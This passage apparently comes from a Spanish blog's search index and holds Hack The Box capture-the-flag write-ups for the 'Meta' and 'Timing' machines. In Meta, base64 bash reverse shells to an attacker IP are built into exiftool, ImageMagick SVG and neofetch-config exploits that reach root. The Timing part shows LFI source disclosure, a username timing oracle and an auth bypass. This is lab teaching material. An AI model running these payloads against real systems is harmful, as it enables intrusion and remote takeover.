muestra información sensible. Después, el servidor es vulnerable a PolKit. Para comprometer esta máquina se necesitan conocimientos de enumeración en Wordpress","time":8,"title":"Paper"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.140   Fecha: 22 / 01 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.140 Nmap scan report for 10.10.11.140 Host is up (0.064s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://artcorp.htb |_http-server-header: Apache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.97 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.140, se nos redirige a http://artcorp.htb, por lo que tenemos que añadir este dominio en /etc/hosts. Luego, tenemos esta página web:\nParece una página web estática. Vamos a aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://artcorp.htb/FUZZ assets [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms] css [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 51ms] [Status: 200, Size: 4427, Words: 1663, Lines: 87, Duration: 74ms] server-status [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 83ms]  Nada interesante. Como hay un dominio llamado artcorp.htb, es probable que existan otros subdominios. Vamos a enumerar:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.140/ -H 'Host: FUZZ.artcorp.htb' -r -fl 87 dev01 [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 59ms]  Genial, ahora podemos meter dev01.artcorp.htb en /etc/hosts. Esta es la página web:\nAcceso a la máquina Tenemos la posibilidad de subir imágenes. Y esta es la salida:\nExplotación de exiftool Este resultado se parece mucho a la salida de exiftool. Existen algunos CVE relacionados con exiftool. De hecho, el que es explotable es CVE-2022-23935, similar al explotado en Overflow. Entonces, vamos a reproducir los pasos (más información aquí):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim payload $ cat payload (metadata \"\\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};\") $ bzz payload payload.bzz $ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz $ vim configfile $ exiftool -config configfile '-HasselbladExif hacker.jpg 1 image files updated  Ahora, subimos la imagen maliciosa (hacker.jpg) y obtenemos una reverse shell:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:45692. bash: cannot set terminal process group (624): Inappropriate ioctl for device bash: no job control in this shell www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd / cd / www-data@meta:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@meta:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@meta:/$ export TERM=xterm www-data@meta:/$ export SHELL=bash www-data@meta:/$ stty rows 50 columns 158  Enumeración del sistema Después de la enumeración básica, podemos probar a enumerar procesos en ejecución o tareas Cron con pspy:\nCMD: UID=0 PID=22988 | /usr/sbin/CRON -f CMD: UID=1000 PID=22987 | /bin/bash /usr/local/bin/convert_images.sh CMD: UID=0 PID=22989 | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* CMD: UID=1000 PID=22990 | /bin/bash /usr/local/bin/convert_images.sh CMD: UID=0 PID=22992 | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* CMD: UID=0 PID=22991 | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf CMD: UID=0 PID=22993 | /bin/sh -c rm /tmp/* CMD: UID=1000 PID=22994 | pkill mogrify  Vemos comandos interesantes:\n /bin/bash /usr/local/bin/convert_images.sh cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf  Movimiento lateral al usuario thomas El segundo se ejecuta por el usuario thomas:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls /home thomas www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas total 32 drwxr-xr-x 4 thomas thomas 4096 Jan 17 2022 . drwxr-xr-x 3 root root 4096 Aug 29 2021 .. lrwxrwxrwx 1 root root 9 Aug 29 2021 .bash_history - /dev/null -rw-r--r-- 1 thomas thomas 220 Aug 29 2021 .bash_logout -rw-r--r-- 1 thomas thomas 3526 Aug 29 2021 .bashrc drwxr-xr-x 3 thomas thomas 4096 Aug 30 2021 .config -rw-r--r-- 1 thomas thomas 807 Aug 29 2021 .profile drwx------ 2 thomas thomas 4096 Jan 4 2022 .ssh -rw-r----- 1 root thomas 33 Oct 10 14:28 user.txt www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /home/thomas/.config/ total 12 drwxr-xr-x 3 thomas thomas 4096 Aug 30 2021 . drwxr-xr-x 4 thomas thomas 4096 Jan 17 2022 .. drwxr-xr-x 2 thomas thomas 4096 Dec 20 2021 neofetch  Por el momento no es interesante. Vamos a centrarnos en el primero:\nwww-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh  #!/bin/bash cd/var/www/dev01.artcorp.htb/convert_images/ \u0026amp;\u0026amp;/usr/local/bin/mogrify -format png *.*2\u0026gt;/dev/null  pkill mogrify  Explotación de mogrify Está usando mogrify para formatear imágenes PNG. De hecho, mogrify es parte de ImageMagick:\nwww-data@meta:/tmp$ file /usr/local/bin/mogrify /usr/local/bin/mogrify: symbolic link to magick www-data@meta:/tmp$ ls -l /usr/local/bin/mogrify lrwxrwxrwx 1 root root 6 Aug 29 2021 /usr/local/bin/mogrify -\u0026gt; magick www-data@meta:/tmp$ ls -l /usr/local/bin/magick -rwxr-xr-x 1 root root 40048 Aug 29 2021 /usr/local/bin/magick www-data@meta:/tmp$ file /usr/local/bin/magick /usr/local/bin/magick: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fd45a758ab7b339514d807f4864ab010510497ac, with debug_info, not stripped  Tenemos la versión 7.0.10-36:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ /usr/local/bin/magick -version Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org Copyright: © 1999-2020 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib  Existen algunas vulnerabilidades en ImageMagick. La que se puede explotar tiene relación con inyección de comandos (más información aquí). Podemos reproducir la prueba de concepto con este archivo SVG:\n\u0026lt;imageauthenticate='ff\" `echo $(id)\u0026gt; /dev/shm/0wned`;\"'\u0026gt; \u0026lt;readfilename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;getwidth=\"base-width\"height=\"base-height\"/\u0026gt; \u0026lt;resizegeometry=\"400x400\"/\u0026gt; \u0026lt;writefilename=\"test.png\"/\u0026gt; \u0026lt;svgwidth=\"700\"height=\"700\"xmlns=\"http://www.w3.org/2000/svg\"xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt;  \u0026lt;imagexlink:href=\"msl:poc.svg\"height=\"100\"width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt;  Vamos a crear el archivo y a esperar hasta ver un archivo llamado 0wned en /dev/shm:\nwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /tmp www-data@meta:/tmp$ cat \u0026gt; poc.svg \u0026lt;image authenticate='ff\" `echo $(id)\u0026gt; /dev/shm/0wned`;\"'\u0026gt; \u0026lt;read filename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;get width=\"base-width\" height=\"base-height\" /\u0026gt; \u0026lt;resize geometry=\"400x400\" /\u0026gt; \u0026lt;write filename=\"test.png\" /\u0026gt; \u0026lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt; \u0026lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; ^C www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/ www-data@meta:/tmp$ watch -n 1 ls -l /dev/shm/ www-data@meta:/tmp$ cat /dev/shm/0wned uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)  Y así conseguimos ejecución de comandos como thomas. Vamos a obtener una reverse shell:\nwww-data@meta:/tmp$ cat \u0026gt; poc.svg \u0026lt;image authenticate='ff\" `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash`;\"'\u0026gt; \u0026lt;read filename=\"pdf:/etc/passwd\"/\u0026gt; \u0026lt;get width=\"base-width\" height=\"base-height\" /\u0026gt; \u0026lt;resize geometry=\"400x400\" /\u0026gt; \u0026lt;write filename=\"test.png\" /\u0026gt; \u0026lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u0026gt; \u0026lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; ^C www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/  $ nc -nlvp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:52884. bash: cannot set terminal process group (3281): Inappropriate ioctl for device bash: no job control in this shell thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cd cd thomas@meta:~$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null thomas@meta:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [2] - continued ncat -nlvp 4444 reset xterm thomas@meta:~$ export TERM=xterm thomas@meta:~$ export SHELL=bash thomas@meta:~$ stty rows 50 columns 158  En este punto, podemos leer la flag user.txt:\nthomas@meta:~$ cat user.txt 90e73aa77e1fcd5656877f63ae5c9fc5  Escalada de privilegios Este usuario puede ejecutar sudo:\nthomas@meta:~$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"  Se nos permite ejecutar neofetch como root sin contraseña:\nthomas@meta:~$ sudo /usr/bin/neofetch \\\"\\\" _,met$$$$$gg. root@meta ,g$$$$$$$$$$$$$$$P. --------- ,g$$P\" \"\"\"Y$$.\". OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P' `$$$. Host: VMware Virtual Platform None ',$$P ,ggs. `$$b: Kernel: 4.19.0-17-amd64 `d$$' ,$P\"' .$$$ Uptime: 1 hour, 24 mins $$P d$' ,$$P Packages: 495 (dpkg) $$: $$. -,d$$' Shell: bash 5.0.3 $$; Y$b._ _,d$P' Terminal: script Y$$. `.`\"Y$$$$P\"' CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz `$$b \"-.__ GPU: VMware SVGA II Adapter `Y$$ Memory: 139MiB / 1994MiB `Y$$. `$$b.  `Y$$b. `\"Y$b._ `\"\"\"  De hecho, podemos usar un archivo de configuración que será ejecutado al usar neofetch. Aquí podemos ver un ejemplo de este archivo de configuración.\nComo no podemos modificar el comando, tenemos que llamar al archivo de configuración por defecto, que es ~/.config/neofetch/config.conf. Pero tenemos que poner una variable de entorno llamada XDG_CONFIG_HOME, según el código fuente:\nget_user_config() { # --config /path/to/config.conf if[[ -f\"$config_file\"]];then source\"$config_file\" err \"Config: Sourced user config. (${config_file})\" return elif[[ -f\"${XDG_CONFIG_HOME}/neofetch/config.conf\"]];then source\"${XDG_CONFIG_HOME}/neofetch/config.conf\" err \"Config: Sourced user config. (${XDG_CONFIG_HOME}/neofetch/config.conf)\" elif[[ -f\"${XDG_CONFIG_HOME}/neofetch/config\"]];then source\"${XDG_CONFIG_HOME}/neofetch/config\" err \"Config: Sourced user config. (${XDG_CONFIG_HOME}/neofetch/config)\" elif[[ -z\"$no_config\"]];then config_file=\"${XDG_CONFIG_HOME}/neofetch/config.conf\" # The config file doesn't exist, create it. mkdir -p \"${XDG_CONFIG_HOME}/neofetch/\" printf'%s\\n'\"$config\"\u0026gt;\"$config_file\" fi }  Como esto se va a ejecutar como root (usando sudo), vamos a obtener otra reverse shell:\nthomas@meta:~$ cat \u0026gt; .config/neofetch/config.conf echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash ^C thomas@meta:~$ export XDG_CONFIG_HOME=/home/thomas/.config  Podemos ejecutar cualquier otro comando. Por ejemplo, podemos ir a GTFOBins, o usar mi herramienta gtfobins-cli:\n$ gtfobins-cli --sudo neofetch neofetch ==\u0026gt; https://gtfobins.github.io/gtfobins/neofetch/ Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. TF=$(mktemp) echo 'exec /bin/sh' \u0026gt;$TF sudo neofetch --config $TF  Y al ejecutar neofetch con sudo, obtenemos la reverse shell como root:\n$ nc -nlvp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.140. Ncat: Connection from 10.10.11.140:52892. root@meta:/home/thomas# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@meta:/home/thomas# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm root@meta:/home/thomas# export TERM=xterm root@meta:/home/thomas# export SHELL=bash root@meta:/home/thomas# stty rows 50 columns 158 root@meta:/home/thomas# cd root@meta:~# cat root.txt 5ace1c9be16771a731dde13dcd8d186e  ","image":"/images/HTB/Meta/Meta.png","permalink":"https://7rocky.github.io/htb/meta/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una página web que analiza imágenes subidas con una versión vulnerable de exiftool que deriva en RCE. Luego, existe una tarea Cron que transforma imágenes con el comando mogrify de ImageMagick, que es vulnerable a inyección de comandos. Finalmente, tenemos permisos de sudo para ejecutar neofetch, lo cual posibilita la escalada de privilegios","time":6,"title":"Meta"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.135   Fecha: 11 / 12 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.135 -p 22,80 Nmap scan report for 10.10.11.135 Host is up (0.053s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Simple WebApp |_Requested resource was ./login.php |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.51 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.135 se nos redirige a un formulario de inicio de sesión (/login.php):\nPodemos probar cuentas por defecto pero obtenemos un mensaje de error:\nSin embargo, debido al nombre de la máquina (\u0026ldquo;Timing\u0026rdquo;), podríamos pensar en ataques basados en tiempo. Aquí hay una sencilla prueba de concepto con curl:\n$ time curl '10.10.11.135/login.php?login=true' -sd 'user=admin\u0026password=x' \u0026gt; /dev/null 1,36 real 0,01 user 0,00 sys $ time curl '10.10.11.135/login.php?login=true' -sd 'user=asdf\u0026password=x' \u0026gt; /dev/null 0,24 real 0,01 user 0,00 sys  Con esto, podemos deducir que admin es un nombre de usuario válido. Vamos a ver si hay más usuarios con ffuf usando este oráculo de tiempo:\n$ ffuf -w $WORDLISTS/names.txt -u 'http://10.10.11.135/login.php?login=true' -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=FUZZ\u0026password=asdf' -t 5 -ft '\u0026lt;1000' aaron [Status: 200, Size: 5963, Words: 1878, Lines: 188, Duration: 1149ms] admin [Status: 200, Size: 5963, Words: 1878, Lines: 188, Duration: 1507ms]  Nótese que puse 5 hilos (threads), si no, se obtendrían falsos positivos. Podemos tratar de encontrar sus contraseñas, pero no siguen el mismo oráculo de tiempo.\nPor tanto, tenemos que seguir enumerando. Vamos a ver qué rutas y archivos hay con ffuf:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.135/FUZZ -e .php images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 138ms] login.php [Status: 200, Size: 5609, Words: 1755, Lines: 178, Duration: 50ms] profile.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms] image.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms] header.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms] footer.php [Status: 200, Size: 3937, Words: 1307, Lines: 116, Duration: 60ms] upload.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms] css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 81ms] index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4219ms] js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 80ms] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 104ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 80ms] .php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 80ms] server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 60ms]  Encontrando un LFI Nótese que hay un archivo raro llamado image.php que devuelve 200 OK pero sin cuerpo de respuesta. Por el nombre del archivo, podríamos usar algún parámetro y apuntarlo a un archivo. Por este motivo, vamos a usar ffuf de nuevo para ver si conseguimos el nombre del parámetro (podemos pedir un archivo válido como /etc/passwd):\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?FUZZ=/etc/passwd' -fs 0 img [Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 3158ms]  Ahí está, y tiene un cuerpo de respuesta, vamos ver qué nos dice:\n$ curl '10.10.11.135/image.php?img=/etc/passwd' Hacking attempt detected!  Oh, nos han pillado. Tenemos una inclusión de archivo locales (Local File Inclusion, LFI). Lo sabemos porque si apuntamos el parámetro al index.php no se muestra ningun contenido de respuesta y se nos redirige a /login.php (por lo que se ejecuta el código PHP):\n$ curl '10.10.11.135/image.php?img=index.php' -i HTTP/1.1 302 Found Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=3t8sqtja7l7ea3h3v9f904pc1l; expires=Wed, 01-Jun-2022 17:35:16 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: ./login.php Content-Length: 0 Content-Type: text/html; charset=UTF-8  Sin embargo, podemos extraer el código fuente con un wrapper PHP para convertirlo a Base64, de manera que no aparezcan etiquetas \u0026lt;?php y el contenido no se ejecute. Esto es index.php:\n$ curl '10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=index.php' PD9waHAKaW5jbHVkZV9vbmNlICJoZWFkZXIucGhwIjsKPz4KCjxoMSBjbGFzcz0idGV4dC1jZW50ZXIiIHN0eWxlPSJwYWRkaW5nOiAyMDBweCI+WW91IGFyZSBsb2dnZWQgaW4gYXMgdXNlciA8P3BocCBlY2hvICRfU0VTU0lPTlsndXNlcmlkJ107ID8+ITwvaDE+Cgo8P3BocAppbmNsdWRlX29uY2UgImZvb3Rlci5waHAiOwo/Pgo= $ curl '10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=index.php' -s | base64 -d  \u0026lt;?php include_once \"header.php\"; ?\u0026gt; \u0026lt;h1 class=\"text-center\" style=\"padding: 200px\"\u0026gt;You are logged in as user \u0026lt;?php echo $_SESSION['userid']; ?\u0026gt;!\u0026lt;/h1\u0026gt; \u0026lt;?php include_once \"footer.php\"; ?\u0026gt;  Analizando código fuente PHP Ahora podemos leer el código fuente en PHP. Usaré esta función en Bash para leer los archivo más fácilmente:\n$ function read_file() { curl \"10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$1\" -s | base64 -d; }  Esto es login.php, veamos cómo se gestiona la autenticación:\n$ read_file login.php  \u0026lt;?php include \"header.php\"; function createTimeChannel() { sleep(1); } include \"db_conn.php\"; if (isset($_SESSION['userid'])){ header('Location: ./index.php'); die(); } if (isset($_GET['login'])) { $username = $_POST['user']; $password = $_POST['password']; $statement = $pdo-\u0026gt;prepare(\"SELECT * FROM users WHERE username = :username\"); $result = $statement-\u0026gt;execute(array('username' =\u0026gt; $username)); $user = $statement-\u0026gt;fetch(); if ($user !== false) { createTimeChannel(); if (password_verify($password, $user['password'])) { $_SESSION['userid'] = $user['id']; $_SESSION['role'] = $user['role']; header('Location: ./index.php'); return; } } $errorMessage = \"Invalid username or password entered\"; } ?\u0026gt; \u0026lt;!-- ... --\u0026gt;  Está utilizando password_verify, que no es vulnerable a ataques de tiempo (como se dice en www.php.net).\nPodemos encontrar credentiales para la conexión a la base de datos en db_conn.php (que se llama en login.php):\n$ read_file db_conn.php  \u0026lt;?php $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');  Podemos probar a reutilizar estas credenciales para admin o aaron en la web, o incluso para aaron por SSH. Sabemos que se trata de un usuario a nivel de sistema porque aparece en /etc/passwd:\n$ read_file /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash  A propósito, este es el archivo que estamos explotando:\n$ read_file image.php  \u0026lt;?php function is_safe_include($text) { $blacklist = array(\"php://input\", \"phar://\", \"zip://\", \"ftp://\", \"file://\", \"http://\", \"data://\", \"expect://\", \"https://\", \"../\"); foreach ($blacklist as $item) { if (strpos($text, $item) !== false) { return false; } } return substr($text, 0, 1) !== \"/\"; } if (isset($_GET['img'])) { if (is_safe_include($_GET['img'])) { include($_GET['img']); } else { echo \"Hacking attempt detected!\"; } }  Queda claro que estamos explotando una inclusión de archivos locales (nótese el uso de la función include). Podríamos haber usado letras mayúsculas para saltarnos los filtros:\n$ curl '10.10.11.135/image.php?img=File:///etc/hosts' 127.0.0.1 localhost timing.htb 127.0.1.1 timing # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters  Ahora deberíamos escalar el LFI a una ejecución remota de comandos (RCE). Recordemos que ffuf mostró un archivo llamado upload.php:\n$ read_file upload.php  \u0026lt;?php include(\"admin_auth_check.php\"); $upload_dir = \"images/uploads/\"; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]); $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } } // Check if file already exists if (file_exists($target_file)) { $error = \"Sorry, file already exists.\"; } if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; } if (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; } ?\u0026gt;  Este archivo parece prometedor. Si somos capaces de subir un archivo PHP al servidor, podríamos acceder mediante el LFI y conseguir RCE. Pero primero vamos a ver para qué se utiliza admin_auth_check.php:\n$ read_file admin_auth_check.php  \u0026lt;?php include_once \"auth_check.php\"; if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) { echo \"No permission to access this panel!\"; header('Location: ./index.php'); die(); } ?\u0026gt;  Por tanto, necesitamos tener una sesión válida con un role igual a 1. Nótese que se utiliza != (y no !==), por lo que es vulnerable a Type Juggling.\nY también necesitamos burlar auth_check.php\u0026hellip;\n$ read_file auth_check.php  \u0026lt;?php //ini_set('display_errors', '1'); //ini_set('display_startup_errors', '1'); //error_reporting(E_ALL); // session is valid for 1 hour ini_set('session.gc_maxlifetime', 3600); session_set_cookie_params(3600); session_start(); if (!isset($_SESSION['userid']) \u0026amp;\u0026amp; strpos($_SERVER['REQUEST_URI'], \"login.php\") === false) { header('Location: ./login.php'); die(); } ?\u0026gt;  Aquí tenemos una mala configuración, ¿la ves? El programa entrará al bloque if siempre que nuestra sesión no esté configurada y siempre que \u0026quot;login.php\u0026quot; no aparezca en la URI de petición. Obviamente, no podemos conseguir una sesión válida (no tenemos credenciales), por tanto\u0026hellip; Tenemos que acceder a auth_check.php poniendo \u0026quot;login.php\u0026quot; en la URI de petición de alguna manera, para que el programa no entre al bloque if.\nPodemos hacer esto añadiendo login.php como un parámetro de URL. Mira las diferencias:\n$ curl '10.10.11.135/auth_check.php' -i HTTP/1.1 302 Found Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=ian71bvoa9a3t6f2l35g53rl4t; expires=Wed, 01-Jun-2022 18:16:54 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: ./login.php Content-Length: 0 Content-Type: text/html; charset=UTF-8 $ curl '10.10.11.135/auth_check.php?login.php' -i HTTP/1.1 200 OK Date: Server: Apache/2.4.29 (Ubuntu) Set-Cookie: PHPSESSID=2li2bbhv1cafb9i4jkm74i5392; expires=Wed, 01-Jun-2022 18:16:56 GMT; Max-Age=3600; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 0 Content-Type: text/html; charset=UTF-8  Entonces ya tenemos una manera de saltarnos auth_check.php. Pero no podemos saltarnos admin_auth_check.php. Por tanto, vamos a seguir enumerando.\nEsto es 